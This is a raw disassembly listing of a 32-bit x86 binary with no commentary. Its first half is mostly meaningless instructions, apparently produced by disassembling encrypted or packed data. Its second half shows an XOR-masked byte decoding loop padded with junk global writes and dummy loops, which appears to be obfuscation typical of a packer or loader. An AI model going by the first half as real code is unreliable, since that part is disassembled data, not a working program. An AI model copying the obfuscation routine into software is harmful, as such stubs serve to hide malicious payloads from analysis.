  407f9f:	rcl    DWORD PTR [ebx+0x58bef279],1
  407fa5:	in     eax,dx
  407fa6:	and    DWORD PTR [ebp+0x6c],esi
  407fa9:	adc    al,0xe6
  407fab:	add    esp,DWORD PTR [esi-0x59b0f189]
  407fb1:	das    
  407fb2:	ss das 
  407fb4:	dec    edi
  407fb5:	jmp    0x569e9c6c
  407fba:	rcr    BYTE PTR [esi],cl
  407fbc:	mov    al,ds:0x5694ee2c
  407fc1:	xor    eax,DWORD PTR [ebx]
  407fc3:	dec    ebp
  407fc4:	lods   eax,DWORD PTR ds:[esi]
  407fc5:	arpl   WORD PTR [esi],ax
  407fc7:	sub    al,0x19
  407fc9:	pop    ecx
  407fca:	pushf  
  407fcb:	idiv   DWORD PTR [ebx*2+0x2606ab91]
  407fd2:	or     eax,ebx
  407fd4:	(bad)  
  407fd5:	icebp  
  407fd6:	enter  0xb53c,0xe
  407fda:	add    bl,BYTE PTR [esi]
  407fdc:	jl     0x408026
  407fde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fdf:	adc    ch,ch
  407fe1:	or     eax,0x38743798
  407fe6:	mov    bh,0x46
  407fe8:	int3   
  407fe9:	mov    edx,0xd2d075e6
  407fee:	xor    al,0x62
  407ff0:	add    dl,BYTE PTR [esi+0x6b195ec5]
  407ff6:	ds cli 
  407ff8:	cmp    BYTE PTR ds:0x502de4eb,dl
  407ffe:	add    dl,BYTE PTR [edi+0xe]
  408001:	mov    ds:0xc92b164,al
  408006:	mov    edi,0xb1facad5
  40800b:	and    eax,edi
  40800d:	dec    ebp
  40800e:	ret    
  40800f:	dec    esi
  408010:	push   cs
  408011:	pop    esi
  408012:	stos   DWORD PTR es:[edi],eax
  408013:	sub    dh,al
  408015:	jnp    0x40808f
  408017:	icebp  
  408018:	mov    ds:0x8dbda279,al
  40801d:	test   al,0x43
  40801f:	ror    DWORD PTR [esp+eax*2+0x161b8c85],0x48
  408027:	pop    edi
  408028:	out    dx,eax
  408029:	dec    ecx
  40802a:	xchg   esi,eax
  40802b:	xor    BYTE PTR ss:0x944e3588,ah
  408032:	bound  ecx,QWORD PTR [edx-0x1d]
  408035:	ss xchg ebx,eax
  408037:	inc    ebp
  408038:	xor    ch,BYTE PTR [edx+0x76]
  40803b:	jecxz  0x408012
  40803d:	and    DWORD PTR [ecx],ecx
  40803f:	ins    BYTE PTR es:[edi],dx
  408040:	jmp    0x730ce456
  408045:	jbe    0x407fed
  408047:	dec    ebp
  408048:	push   0x34
  40804a:	add    al,BYTE PTR [ebp+0x44]
  40804d:	adc    al,0x50
  40804f:	dec    esp
  408050:	cmp    si,WORD PTR [ecx+ecx*2-0x2bcc4c31]
  408058:	test   eax,0x3983d720
  40805d:	rol    bl,cl
  40805f:	not    DWORD PTR [ebp-0x3cf55956]
  408065:	mov    ch,0x69
  408067:	and    edx,DWORD PTR fs:[eax-0x61]
  40806b:	rol    DWORD PTR [ecx],cl
  40806d:	das    
  40806e:	lds    esp,FWORD PTR [eax+0x8615a45]
  408074:	sbb    al,0xcc
  408076:	xchg   ebx,eax
  408077:	fadd   QWORD PTR [eax+esi*2-0x12]
  40807b:	xor    eax,0xbb926108
  408080:	pop    ds
  408081:	sub    DWORD PTR [ebp+edi*8+0x38ff37ed],0xffffff8a
  408089:	lods   al,BYTE PTR ds:[esi]
  40808a:	or     cl,BYTE PTR [edi+eax*1]
  40808d:	xchg   ebx,eax
  40808e:	sbb    eax,0x9e8b9bbc
  408093:	test   BYTE PTR [edx+0x1],cl
  408096:	gs mov edi,0x625fb6bb
  40809c:	mov    esp,0x38ed6ac3
  4080a1:	bound  edi,QWORD PTR [edi-0x3ec8318b]
  4080a7:	jbe    0x40804d
  4080a9:	in     eax,0x68
  4080ab:	popa   
  4080ac:	pushf  
  4080ad:	loop   0x4080bc
  4080af:	pop    ss
  4080b0:	or     ebp,DWORD PTR [edx+0x62]
  4080b3:	pop    ss
  4080b4:	mov    bl,0xc4
  4080b6:	scas   eax,DWORD PTR es:[edi]
  4080b7:	mov    al,0xd7
  4080b9:	cdq    
  4080ba:	sub    eax,DWORD PTR [eax]
  4080bc:	aad    0xc5
  4080be:	(bad)  
  4080c0:	inc    ecx
  4080c1:	lock push 0x39ff2456
  4080c7:	je     0x40813a
  4080c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080ca:	mov    ebx,0xe30dc1c6
  4080cf:	icebp  
  4080d0:	sbb    BYTE PTR [esp+ebp*1+0x7d6765b5],dl
  4080d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080d8:	hlt    
  4080d9:	push   0x54
  4080db:	sub    ah,BYTE PTR [ebp-0x127a8f9c]
  4080e1:	fidivr DWORD PTR [ebp-0x3b064861]
  4080e7:	dec    edi
  4080e8:	add    BYTE PTR [edx+0x61],bh
  4080eb:	aam    0x93
  4080ed:	inc    ecx
  4080ee:	mov    al,0xb9
  4080f0:	sbb    eax,DWORD PTR [ecx]
  4080f2:	mov    edi,0x76641756
  4080f7:	shl    BYTE PTR [ecx+0x71f458fe],1
  4080fd:	sti    
  4080fe:	xlat   BYTE PTR ds:[ebx]
  4080ff:	arpl   WORD PTR [ebx+0x4727a7a9],bx
  408105:	inc    edi
  408106:	and    DWORD PTR [ebx],ecx
  408108:	data16 int 0xed
  40810b:	xchg   ebx,eax
  40810c:	or     ebp,ecx
  40810e:	call   0x4eaf:0xb01e190
  408115:	cli    
  408116:	dec    esp
  408117:	ret    0xf72e
  40811a:	fld    QWORD PTR [edi]
  40811c:	push   0xb
  40811e:	jbe    0x4080c4
  408120:	retf   0xca31
  408123:	ret    0x6595
  408126:	(bad)  
  408128:	and    DWORD PTR [edi-0x376712c5],ebx
  40812e:	rcr    DWORD PTR [ecx+esi*2+0x6a],1
  408132:	lea    edi,[si]
  408135:	xchg   BYTE PTR [esi-0x1ba65d9],bh
  40813b:	test   al,0x77
  40813d:	mov    DWORD PTR [ebp+0x3353a8fb],edi
  408143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408144:	lds    ebx,FWORD PTR [edi-0x2d9b2c20]
  40814a:	aas    
  40814b:	ret    0x2c38
  40814e:	jmp    FWORD PTR [ebp-0x4]
  408151:	dec    esi
  408152:	in     al,dx
  408153:	jecxz  0x408126
  408155:	lock mov bl,0x12
  408158:	mov    esp,0x2e1fa4fc
  40815d:	sahf   
  40815e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40815f:	sar    DWORD PTR ds:0x5457d0c5,0x1c
  408166:	jb     0x408114
  408168:	mov    eax,esi
  40816a:	js     0x4080ec
  40816c:	add    BYTE PTR [esp+ebx*8-0x77],dl
  408170:	popa   
  408171:	xlat   BYTE PTR ds:[ebx]
  408172:	jbe    0x4081f0
  408174:	pop    ebx
  408175:	into   
  408176:	jl     0x4081b3
  408178:	inc    ecx
  408179:	push   edx
  40817a:	dec    edx
  40817b:	jmp    0x4081ac
  40817d:	test   al,0x6c
  40817f:	(bad)  
  408181:	pop    ebp
  408182:	sbb    eax,0x5ba153ff
  408187:	popa   
  408188:	data16 (bad) 
  40818a:	pop    eax
  40818b:	js     0x4081eb
  40818d:	daa    
  40818e:	dec    eax
  40818f:	outs   dx,BYTE PTR ds:[esi]
  408190:	sar    ebx,cl
  408192:	or     BYTE PTR [edi],0x3b
  408195:	xchg   ebx,eax
  408196:	dec    ecx
  408197:	mov    al,0x21
  408199:	js     0x4081e8
  40819b:	mov    ebp,0xae886c4d
  4081a0:	enter  0x20a,0x50
  4081a4:	sbb    eax,0x90d783dc
  4081a9:	mov    WORD PTR [ecx-0x80],gs
  4081ac:	mov    esi,0x55978c40
  4081b1:	fsub   st(0),st
  4081b3:	lock cwde 
  4081b5:	pop    ds
  4081b6:	stos   BYTE PTR es:[edi],al
  4081b7:	(bad)  
  4081b9:	std    
  4081ba:	inc    edi
  4081bb:	dec    ecx
  4081bc:	ins    BYTE PTR es:[edi],dx
  4081bd:	pop    ebp
  4081be:	inc    ebp
  4081bf:	ret    
  4081c0:	cmp    eax,0xf58a225d
  4081c5:	pop    eax
  4081c6:	and    al,0x74
  4081c8:	int    0x54
  4081ca:	(bad)  
  4081cb:	je     0x4081a9
  4081cd:	cmp    ebp,DWORD PTR [edx]
  4081cf:	ss aas 
  4081d1:	adc    DWORD PTR [eax-0x23a1ca5b],edx
  4081d7:	mov    BYTE PTR [edx-0x11de3955],ch
  4081dd:	pop    ebp
  4081de:	mov    ah,0x1b
  4081e0:	aam    0x88
  4081e2:	xbegin 0x66075e0f
  4081e8:	mov    edx,0xfaa08f8b
  4081ed:	cmp    DWORD PTR [edx-0x7d],edx
  4081f0:	push   edi
  4081f1:	mov    ebx,0x862e35f
  4081f6:	pop    esp
  4081f7:	(bad)  
  4081f8:	rol    DWORD PTR [ecx+0x2d],cl
  4081fb:	fisttp WORD PTR [ebp+0x14]
  4081fe:	(bad)  
  4081ff:	stc    
  408200:	popa   
  408201:	dec    edx
  408202:	push   ebx
  408203:	fwait
  408204:	clc    
  408205:	adc    al,0x60
  408207:	inc    edx
  408208:	test   al,0x4a
  40820a:	mov    ecx,0x67c68de8
  40820f:	aas    
  408210:	outs   dx,DWORD PTR ds:[esi]
  408211:	mov    gs,WORD PTR [edi-0xd]
  408214:	ins    BYTE PTR es:[edi],dx
  408215:	sbb    ah,BYTE PTR [edx-0x2e]
  408218:	xchg   edi,eax
  408219:	test   al,0x84
  40821b:	stc    
  40821c:	xchg   BYTE PTR [esi+0x55],ch
  40821f:	int    0xee
  408221:	add    al,0x10
  408223:	ins    BYTE PTR es:[edi],dx
  408224:	push   esi
  408225:	pop    ebp
  408226:	xchg   edx,eax
  408227:	push   eax
  408228:	sbb    BYTE PTR [esi+eiz*1],ch
  40822b:	out    0xf5,eax
  40822d:	push   edx
  40822e:	push   ebx
  40822f:	fs and al,0x5a
  408232:	pop    eax
  408233:	mov    ch,0x51
  408235:	inc    edx
  408236:	jl     0x408238
  408238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408239:	icebp  
  40823a:	or     ah,al
  40823c:	leave  
  40823d:	mov    ds:0x20be90de,eax
  408242:	push   esi
  408243:	xor    edx,DWORD PTR [esp+edi*2]
  408246:	clc    
  408247:	add    ch,0x18
  40824a:	test   DWORD PTR [eax],0xaf263a18
  408250:	arpl   WORD PTR [ecx-0x22],si
  408253:	aam    0x36
  408255:	(bad)  
  408256:	in     eax,dx
  408257:	sbb    eax,0x8995e8eb
  40825c:	pop    esp
  40825d:	shr    dl,1
  40825f:	loop   0x4082a4
  408261:	add    DWORD PTR [edi-0x2cb34ce6],edi
  408267:	xor    bl,BYTE PTR [eax+0xf95a4c1]
  40826d:	cdq    
  40826e:	and    al,0xd8
  408270:	(bad)  
  408271:	adc    esi,ebx
  408273:	pop    ebx
  408274:	jge    0x408254
  408276:	xchg   esp,eax
  408277:	idiv   cl
  408279:	out    0xe5,eax
  40827b:	xor    DWORD PTR [edx+eax*1],ebp
  40827e:	jbe    0x40821e
  408280:	xchg   ebp,eax
  408281:	stc    
  408282:	in     eax,0xbf
  408284:	adc    eax,0x6d8722a1
  408289:	ret    0x9a54
  40828c:	stc    
  40828d:	(bad)  
  40828e:	int3   
  40828f:	mov    esi,0x780d6507
  408294:	mov    al,0x93
  408296:	(bad)  
  408297:	jle    0x40828b
  408299:	inc    edx
  40829a:	ss dec esp
  40829c:	test   DWORD PTR ds:0xf7a19818,ebp
  4082a2:	loope  0x4082c8
  4082a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082a5:	xchg   ebp,eax
  4082a6:	add    al,0x17
  4082a8:	xchg   esp,eax
  4082a9:	cwde   
  4082aa:	push   eax
  4082ab:	jp     0x4082dc
  4082ad:	jne    0x408230
  4082af:	push   ebp
  4082b0:	mov    esi,0xd9937ecc
  4082b5:	scas   eax,DWORD PTR es:[edi]
  4082b6:	icebp  
  4082b7:	add    ebx,DWORD PTR [ecx-0x79]
  4082ba:	shr    edx,cl
  4082bc:	ret    
  4082bd:	iret   
  4082be:	ror    DWORD PTR [edi+0x12729bf6],1
  4082c4:	jae    0x408280
  4082c6:	ins    DWORD PTR es:[edi],dx
  4082c7:	and    ebx,esp
  4082c9:	mov    ebx,0x1b36864e
  4082ce:	adc    eax,0xc7cce6a2
  4082d3:	inc    ebx
  4082d4:	in     al,0x89
  4082d6:	xchg   edx,eax
  4082d7:	idiv   bh
  4082d9:	into   
  4082da:	pop    ebp
  4082db:	mov    ss,WORD PTR [edx+0x14]
  4082de:	cmp    esi,DWORD PTR [eax+0xb]
  4082e1:	pop    esi
  4082e2:	pop    edx
  4082e3:	pop    ecx
  4082e4:	test   DWORD PTR [eax+0x60],esi
  4082e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082e8:	in     al,dx
  4082e9:	neg    esp
  4082eb:	cs pop esi
  4082ed:	xlat   BYTE PTR ds:[ebx]
  4082ee:	call   0xaa4e:0x4b813881
  4082f5:	jns    0x4082fd
  4082f7:	sti    
  4082f8:	xor    DWORD PTR [eax],0x38f4916c
  4082fe:	dec    ebx
  4082ff:	call   FWORD PTR [ebx+0x6cff0962]
  408305:	push   esi
  408306:	or     ebx,DWORD PTR [edi+0x1038c2a7]
  40830c:	clc    
  40830d:	or     BYTE PTR [eax-0xd],dh
  408310:	test   BYTE PTR [ebp-0x2de4291],0x74
  408317:	cwde   
  408318:	dec    esi
  408319:	mov    edx,0xf31a7cf6
  40831e:	jno    0x40832b
  408320:	cmp    ah,BYTE PTR [esi+edx*8]
  408323:	xor    al,0x5
  408325:	mov    eax,ds:0x2f45f62d
  40832a:	sbb    dh,BYTE PTR [ebp-0x6e094270]
  408330:	mov    cl,0x5a
  408332:	ins    BYTE PTR es:[edi],dx
  408333:	icebp  
  408334:	test   al,0xac
  408336:	fisubr WORD PTR [ecx-0x79]
  408339:	xchg   esi,eax
  40833a:	sub    eax,DWORD PTR [ebx-0x22]
  40833d:	(bad)  
  40833e:	mov    edi,0x4640038e
  408343:	and    BYTE PTR [ebx],cl
  408345:	(bad)  
  408346:	push   esp
  408347:	scas   al,BYTE PTR es:[edi]
  408348:	xor    eax,DWORD PTR [ebx+0x667feb95]
  40834e:	fldcw  WORD PTR [esi+0x52]
  408351:	xchg   esp,eax
  408352:	and    ebp,esi
  408354:	jmp    0x4083bd
  408356:	inc    esi
  408357:	mov    ecx,0xbfb4c72a
  40835c:	inc    edi
  40835d:	adc    dh,0x78
  408360:	int3   
  408361:	cmp    ecx,DWORD PTR [ebx+ebx*8+0x1dc9ec82]
  408368:	push   ss
  408369:	sti    
  40836a:	inc    esp
  40836b:	(bad)  
  40836c:	loopne 0x4083bb
  40836e:	sahf   
  40836f:	scas   eax,DWORD PTR es:[edi]
  408370:	inc    esi
  408371:	rcl    DWORD PTR [edi+0x2faba817],cl
  408377:	ins    BYTE PTR es:[edi],dx
  408378:	xchg   bx,ax
  40837a:	ins    DWORD PTR es:[edi],dx
  40837b:	add    BYTE PTR [ebp+0x3e],bl
  40837e:	push   ss
  40837f:	cmp    eax,0x14f65d31
  408384:	pushf  
  408385:	xchg   edi,edi
  408387:	push   cs
  408388:	mov    ecx,0xe7cffcbf
  40838d:	jg     0x408355
  40838f:	push   0x74
  408391:	test   eax,0xcae1d9cf
  408396:	push   0xffffffc1
  408398:	sub    al,0xb
  40839a:	xor    eax,0x31a3f040
  40839f:	in     eax,dx
  4083a0:	test   eax,0x670f49b0
  4083a5:	mov    ah,0xe9
  4083a7:	and    BYTE PTR [esi+0x433e7488],0x98
  4083ae:	test   al,0xe0
  4083b0:	sbb    al,0x55
  4083b2:	add    BYTE PTR [esi-0x3deb28f7],cl
  4083b8:	add    eax,0x87cdc584
  4083bd:	mov    cl,0x43
  4083bf:	test   eax,0x94e5393
  4083c4:	rol    DWORD PTR [ebp-0x29dcfc5],0x34
  4083cb:	pop    ebp
  4083cc:	sahf   
  4083cd:	cwde   
  4083ce:	xor    esp,eax
  4083d0:	in     al,dx
  4083d1:	mov    dh,0xfa
  4083d3:	std    
  4083d4:	push   edi
  4083d5:	in     al,dx
  4083d6:	sbb    eax,0x29a8aa21
  4083db:	inc    ebx
  4083dc:	pop    edi
  4083dd:	jbe    0x4083f5
  4083df:	call   0x482988ee
  4083e4:	cli    
  4083e5:	xchg   ecx,eax
  4083e6:	pop    edi
  4083e7:	int3   
  4083e8:	ret    0xcb8e
  4083eb:	retf   
  4083ec:	mov    edi,ds
  4083ee:	stos   BYTE PTR es:[edi],al
  4083ef:	jo     0x4083e4
  4083f1:	icebp  
  4083f2:	sub    ecx,DWORD PTR [edx+0x1b]
  4083f5:	push   ebp
  4083f6:	or     eax,0xe8451995
  4083fb:	data16 mov WORD PTR [eax+0x75],ds
  4083ff:	push   es
  408400:	push   esi
  408401:	jge    0x4083b1
  408403:	cmp    cl,BYTE PTR [eax-0x734eab31]
  408409:	adc    BYTE PTR [ecx+edx*8-0x36dbfdc3],dh
  408410:	or     eax,0x1b493fd1
  408415:	lock test al,0xdd
  408418:	out    dx,al
  408419:	call   0x5202:0x3209dd79
  408420:	imul   ebp,DWORD PTR [ebp+eax*8-0x7a],0x22
  408425:	fldenv [edx+0x174a35bb]
  40842b:	fs mov dh,0xa
  40842e:	loopne 0x40842e
  408430:	leave  
  408431:	outs   dx,DWORD PTR ds:[esi]
  408432:	in     eax,dx
  408433:	stos   DWORD PTR es:[edi],eax
  408434:	mov    bl,0xf8
  408436:	mov    eax,eax
  408438:	imul   BYTE PTR [ebx]
  40843a:	mov    ecx,0xe757173c
  40843f:	dec    eax
  408440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408441:	test   DWORD PTR [ecx-0x9065cef],edi
  408447:	iret   
  408448:	and    bh,BYTE PTR [ecx+eiz*8+0x7f]
  40844c:	test   eax,0x9ceab3b9
  408451:	lock inc edx
  408453:	imul   ebp,DWORD PTR [ebx+0x60],0xfffffff2
  408457:	mov    bh,0xd8
  408459:	fild   QWORD PTR [esi]
  40845b:	imul   edi,DWORD PTR [ebp+0x7f9f04ef],0x8bcc34ef
  408465:	jns    0x40842c
  408467:	adc    ebx,DWORD PTR [ecx]
  408469:	mov    al,BYTE PTR [eax+edx*1]
  40846c:	mov    BYTE PTR [ebp-0x1],al
  40846f:	mov    eax,DWORD PTR [ebp-0x30]
  408472:	mov    edx,DWORD PTR [ebp-0xc]
  408475:	xor    eax,esi
  408477:	add    eax,edi
  408479:	imul   eax,edx
  40847c:	mov    edx,DWORD PTR [ebp-0x28]
  40847f:	xor    edx,esi
  408481:	add    eax,edx
  408483:	mov    edx,DWORD PTR [ebp-0x8]
  408486:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  40848e:	mov    edx,DWORD PTR [ebp-0x50]
  408491:	xor    edx,esi
  408493:	lea    eax,[edx+eax*1+0x3272fa]
  40849a:	movzx  edx,BYTE PTR [ebp-0x1]
  40849e:	xor    edx,eax
  4084a0:	mov    BYTE PTR [ebp-0x1],dl
  4084a3:	mov    al,BYTE PTR [ebp-0x1]
  4084a6:	mov    edx,DWORD PTR [ebp-0x30]
  4084a9:	mov    ebx,DWORD PTR [ebp-0xc]
  4084ac:	xor    edx,esi
  4084ae:	add    edx,edi
  4084b0:	imul   edx,ebx
  4084b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4084b6:	mov    BYTE PTR [edx+ebx*1],al
  4084b9:	mov    eax,DWORD PTR [ebp-0x40]
  4084bc:	mov    edx,DWORD PTR [ebp-0x28]
  4084bf:	xor    eax,esi
  4084c1:	xor    edx,esi
  4084c3:	add    eax,edi
  4084c5:	add    edx,edi
  4084c7:	imul   eax,edx
  4084ca:	add    eax,DWORD PTR [ebp-0xc]
  4084cd:	mov    DWORD PTR [ebp-0xc],eax
  4084d0:	mov    eax,DWORD PTR [ebp-0xc]
  4084d3:	mov    edx,DWORD PTR [ebp-0x18]
  4084d6:	cmp    edx,eax
  4084d8:	jb     0x406053
  4084de:	mov    eax,DWORD PTR [ebp-0x28]
  4084e1:	mov    edx,DWORD PTR [ebp-0x18]
  4084e4:	xor    eax,esi
  4084e6:	add    eax,edi
  4084e8:	imul   eax,edx
  4084eb:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ee:	xor    edx,esi
  4084f0:	add    edx,edi
  4084f2:	or     eax,edx
  4084f4:	mov    edx,DWORD PTR [ebp-0x20]
  4084f7:	xor    edx,esi
  4084f9:	add    eax,edx
  4084fb:	mov    edx,DWORD PTR [ebp-0x20]
  4084fe:	xor    edx,esi
  408500:	add    eax,edx
  408502:	mov    edx,DWORD PTR [ebp-0x10]
  408505:	lea    eax,[eax+edx*1+0x64e5f4]
  40850c:	jmp    0x408520
  408511:	mov    eax,DWORD PTR [ebp-0x20]
  408514:	mov    edx,DWORD PTR [ebp-0x10]
  408517:	xor    eax,esi
  408519:	lea    eax,[eax+edx*1+0x3272fa]
  408520:	mov    DWORD PTR [ebp-0x10],eax
  408523:	jmp    0x405fa0
  408528:	mov    ebx,DWORD PTR [ebp-0x3c]
  40852b:	mov    eax,DWORD PTR [ebp+0xc]
  40852e:	xor    eax,esi
  408530:	lea    ecx,[ecx+eax*1+0x3272fa]
  408537:	lea    eax,[ecx-0x3272fa]
  40853d:	xor    eax,esi
  40853f:	cmp    eax,0xf89c95b5
  408544:	jne    0x403bac
  40854a:	dec    DWORD PTR [ebp-0x34]
  40854d:	jne    0x403ba0
  408553:	mov    eax,DWORD PTR [ebp+0x8]
  408556:	mov    ecx,DWORD PTR [ebp+0xc]
  408559:	mov    edx,DWORD PTR [ebp+0x8]
  40855c:	xor    ecx,esi
  40855e:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272fa]
  408565:	xor    eax,esi
  408567:	mov    al,BYTE PTR [eax+ebx*1+0x3272fa]
  40856e:	xor    edx,esi
  408570:	mov    BYTE PTR [edx+ebx*1+0x3272fa],cl
  408577:	mov    ecx,DWORD PTR [ebp+0xc]
  40857a:	xor    ecx,esi
  40857c:	mov    BYTE PTR [ecx+ebx*1+0x3272fa],al
  408583:	mov    eax,DWORD PTR [ebp+0xc]
  408586:	xor    eax,esi
  408588:	add    eax,edi
  40858a:	pop    edi
  40858b:	pop    esi
  40858c:	pop    ebx
  40858d:	leave  
  40858e:	ret    0x8
  408591:	xor    eax,eax
  408593:	ret    
  408594:	push   ebp
  408595:	mov    ebp,esp
  408597:	sub    esp,0x38
  40859a:	and    DWORD PTR ds:0x426ebd,0x0
  4085a4:	mov    eax,ds:0x426ebd
  4085a9:	inc    eax
  4085aa:	mov    ds:0x426ebd,eax
  4085af:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4085b6:	jg     0x4085e2
  4085bc:	jmp    0x4085d5
  4085c1:	push   DWORD PTR [ebp-0x10]
  4085c4:	push   0x2f91
  4085c9:	push   DWORD PTR [ebp-0x20]
  4085cc:	push   DWORD PTR [ebp-0x1c]
  4085cf:	call   DWORD PTR ds:0x42fa1c
  4085d5:	cmp    DWORD PTR ds:0x426ebd,0x1c
  4085dc:	jb     0x4085a4
  4085e2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4085e9:	sbb    DWORD PTR ds:0x426f19,ecx
  4085ef:	push   ebx
  4085f0:	add    DWORD PTR ds:0x426f15,edx
  4085f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4085fd:	xor    DWORD PTR ds:0x426e91,0x301b
  408607:	mov    eax,DWORD PTR [ebp-0x4]
  40860a:	xor    DWORD PTR ds:0x426f2d,0x2f12
  408614:	push   esi
  408615:	sbb    DWORD PTR ds:0x426ed9,edi
  40861b:	mov    esi,0x75108b3
  408620:	or     DWORD PTR ds:0x426eb9,0x50e3
  40862a:	xor    eax,esi
  40862c:	adc    DWORD PTR ds:0x426ecd,0x426e99
  408636:	push   edi
  408637:	mov    edi,0x3272fa
  40863c:	or     DWORD PTR ds:0x426ea1,0x426e81
  408646:	add    eax,edi
  408648:	and    DWORD PTR ds:0x426f29,0x7053
  408652:	mov    DWORD PTR [ebp-0x1c],eax
  408655:	mov    eax,DWORD PTR [ebp+0x14]
  408658:	test   eax,eax
  40865a:	mov    DWORD PTR ds:0x426f09,0x1147
  408664:	je     0x408688
  40866a:	mov    eax,ds:0x426ec5
  40866f:	and    eax,DWORD PTR ds:0x426e89
  408675:	mov    ds:0x426ec5,eax
  40867a:	mov    eax,DWORD PTR [ebp+0x14]
  40867d:	adc    ebx,0x54d7
  408683:	mov    eax,DWORD PTR [eax]
  408685:	mov    DWORD PTR [ebp-0x1c],eax
  408688:	mov    eax,DWORD PTR [ebp-0x4]
  40868b:	and    DWORD PTR ds:0x426ea1,0x0
  408695:	mov    ebx,DWORD PTR ds:0x426ea1
  40869b:	inc    ebx
  40869c:	mov    DWORD PTR ds:0x426ea1,ebx
  4086a2:	cmp    DWORD PTR ds:0x426ea1,0x9
  4086a9:	ja     0x4086e9
  4086af:	jmp    0x4086c2
  4086b4:	push   0x426e8d
  4086b9:	push   DWORD PTR [ebp-0x14]
  4086bc:	call   DWORD PTR ds:0x42fa48
  4086c2:	cmp    DWORD PTR ds:0x426ea1,0x8
  4086c9:	jne    0x4086dc
  4086cf:	mov    ebx,DWORD PTR ds:0x426ea1
  4086d5:	inc    ebx
  4086d6:	mov    DWORD PTR ds:0x426ea1,ebx
  4086dc:	cmp    DWORD PTR ds:0x426ea1,0x1e
  4086e3:	jb     0x408695
  4086e9:	xor    eax,esi
  4086eb:	sbb    ebx,DWORD PTR ds:0x426e85
  4086f1:	add    eax,edi
  4086f3:	mov    DWORD PTR [ebp-0x8],eax
  4086f6:	mov    eax,ds:0x426e85
  4086fb:	sub    DWORD PTR ds:0x426ed9,eax
  408701:	mov    eax,DWORD PTR [ebp-0xc]
  408704:	xor    eax,esi
  408706:	and    DWORD PTR ds:0x426edd,ecx
  40870c:	add    eax,edi
  40870e:	mov    DWORD PTR [ebp-0x24],eax
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	xor    eax,esi
  408716:	and    DWORD PTR ds:0x426eb1,0x0
  408720:	jmp    0x408734
  408725:	xor    ebx,ebx
  408727:	or     ebx,DWORD PTR ds:0x426eb1
  40872d:	inc    ebx
  40872e:	mov    DWORD PTR ds:0x426eb1,ebx
  408734:	cmp    DWORD PTR ds:0x426eb1,0x15
  40873b:	jae    0x40878a
  408741:	cmp    DWORD PTR ds:0x426eb1,0x4
  408748:	ja     0x40878a
  40874e:	jmp    0x40876b
  408753:	push   0x3639
  408758:	push   0x1bb0
  40875d:	push   DWORD PTR [ebp-0x10]
  408760:	push   0x5fa6
  408765:	call   DWORD PTR ds:0x42fa4c
  40876b:	cmp    DWORD PTR ds:0x426eb1,0x3
  408772:	jne    0x408785
  408778:	mov    ebx,DWORD PTR ds:0x426eb1
  40877e:	inc    ebx
  40877f:	mov    DWORD PTR ds:0x426eb1,ebx
  408785:	jmp    0x408725
  40878a:	add    eax,edi
  40878c:	movzx  ebx,BYTE PTR ds:0x426f15
  408793:	sub    DWORD PTR ds:0x426ea1,ebx
  408799:	mov    DWORD PTR [ebp-0x30],eax
  40879c:	sub    eax,eax
  40879e:	mov    ebx,DWORD PTR [ebp-0x4]
  4087a1:	not    eax
  4087a3:	xor    ebx,esi
  4087a5:	add    ebx,edi
  4087a7:	sbb    eax,0xd90
  4087ac:	mov    eax,DWORD PTR [ebp-0x24]
  4087af:	dec    DWORD PTR ds:0x426ea9
  4087b5:	sub    eax,edi
  4087b7:	lea    ecx,[ebx-0x3272fa]
  4087bd:	sbb    DWORD PTR ds:0x426f29,0x78a2
  4087c7:	xor    eax,esi
  4087c9:	add    DWORD PTR ds:0x426ec9,0x4dad
  4087d3:	xor    ecx,esi
  4087d5:	cmp    ecx,eax
  4087d7:	mov    DWORD PTR ds:0x426ef5,0x6961
  4087e1:	je     0x408aae
  4087e7:	add    DWORD PTR ds:0x426f01,0x426f15
  4087f1:	mov    eax,DWORD PTR [ebp-0x4]
  4087f4:	sub    DWORD PTR ds:0x426e81,0x820
  4087fe:	xor    eax,esi
  408800:	add    eax,edi
  408802:	mov    DWORD PTR ds:0x426eb1,0x301a
  40880c:	cmp    ebx,eax
  40880e:	mov    DWORD PTR ds:0x426ee5,0x6594
  408818:	jne    0x408a65
  40881e:	push   DWORD PTR [ebp+0x8]
  408821:	sub    DWORD PTR ds:0x426ee9,0x426f19
  40882b:	call   0x41d4a8
  408830:	mov    DWORD PTR [ebp-0x14],eax
  408833:	sub    DWORD PTR ds:0x426f15,edx
  408839:	mov    eax,DWORD PTR [ebp-0x4]
  40883c:	and    ecx,0x4a39
  408842:	mov    ecx,DWORD PTR [ebp-0x14]
  408845:	xor    eax,esi
  408847:	sub    DWORD PTR ds:0x426eb5,0x426f0d
  408851:	add    eax,edi
  408853:	cmp    ecx,eax
  408855:	je     0x40aece
  40885b:	adc    DWORD PTR ds:0x426f25,0x56c1
  408865:	push   DWORD PTR [ebp-0x14]
  408868:	and    DWORD PTR ds:0x426f29,0x426f11
  408872:	push   DWORD PTR [ebp+0x8]
  408875:	and    DWORD PTR ds:0x426ed1,0x426ef9
  40887f:	call   0x41f8dc
  408884:	and    ecx,0xfc3
  40888a:	mov    DWORD PTR [ebp-0x14],eax
  40888d:	mov    DWORD PTR ds:0x426f09,0x15
  408897:	cmp    DWORD PTR ds:0x426f09,0x0
  40889e:	je     0x4088e4
  4088a4:	cmp    DWORD PTR ds:0x426f09,0x9
  4088ab:	ja     0x4088e4
  4088b1:	jmp    0x4088bc
  4088b6:	call   DWORD PTR ds:0x42fa20
  4088bc:	cmp    DWORD PTR ds:0x426f09,0xa
  4088c3:	jne    0x4088d4
  4088c9:	mov    eax,ds:0x426f09
  4088ce:	dec    eax
